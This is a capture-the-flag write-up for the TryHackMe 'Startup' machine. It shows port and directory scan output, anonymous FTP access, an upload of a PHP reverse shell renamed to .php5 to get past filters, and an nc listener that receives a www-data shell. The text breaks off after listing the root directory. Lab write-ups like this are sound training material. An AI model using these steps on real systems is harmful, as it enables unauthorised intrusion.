# Startup THM machine that is about peppers:

## Recon
Let's run `rustscan` and the `feroxbuster` for the given IP:
**RustScan**
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/forust/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.49.95:21
Open 10.10.49.95:22
Open 10.10.49.95:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 20:52 EEST
Initiating Ping Scan at 20:52
Scanning 10.10.49.95 [2 ports]
Completed Ping Scan at 20:52, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:52
Completed Parallel DNS resolution of 1 host. at 20:52, 0.21s elapsed
DNS resolution of 1 IPs took 0.21s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:52
Scanning 10.10.49.95 [3 ports]
Discovered open port 80/tcp on 10.10.49.95
Discovered open port 22/tcp on 10.10.49.95
Discovered open port 21/tcp on 10.10.49.95
Completed Connect Scan at 20:52, 0.06s elapsed (3 total ports)
Nmap scan report for 10.10.49.95
Host is up, received syn-ack (0.061s latency).
Scanned at 2025-06-03 20:52:29 EEST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

**Feroxbuster:**
```
301      GET        9l       28w      310c http://10.10.49.95/files => http://10.10.49.95/files/
200      GET        1l       40w      208c http://10.10.49.95/files/notice.txt
200      GET        1l       40w      208c http://10.10.49.95/files/ftp/notice.txt
200      GET       20l      113w      808c http://10.10.49.95/                            301      GET        9l       28w      310c http://10.10.49.95/files => http://10.10.49.95/files/200      GET        1l       40w      208c http://10.10.49.95/files/notice.txt 
```
From the feroxbuster we got a point to an FTP, let's try to login with the default credentials
```
anonymous
anonymous
```
And we got a response:
```
Connected to 10.10.49.95.
220 (vsFTPd 3.0.3)
Name (10.10.49.95:forust): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Jun 03 17:46 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

Let's switch to the browser and try to access `/files` directory:
![](Pasted%20image%2020250603205759.png)
We got some files and an `ftp` directory. I'll download them all and try to acess ftp directory:
![](Pasted%20image%2020250603205937.png)
*Originaly, it was an empty directory. I manualy put there notice.txt to test ability to put files there*

Let's read `notice.txt`:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Okay, let's view the image:
![](important.jpg)

okay, rly some unusable image.

Maybe, because of our machine is a website, let's put some php scripts to the `ftp ` folder. Im using [pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
also, i'll rename my `.php` to `.php5` to bypass possible file restrictions:
```
ftp> put reverse.php5
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.0001 seconds (102.0652 Mbytes/s)
ftp> 
```
```
#Setting up listerner:
nc -lvnp
```
And let's open reverse-shell it from the browser
```
Connection from 10.10.49.95:42078
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:13:05 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
And we have the shell.
Let's change directory to the root:
```
cd /
ls
$ cd /
$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
```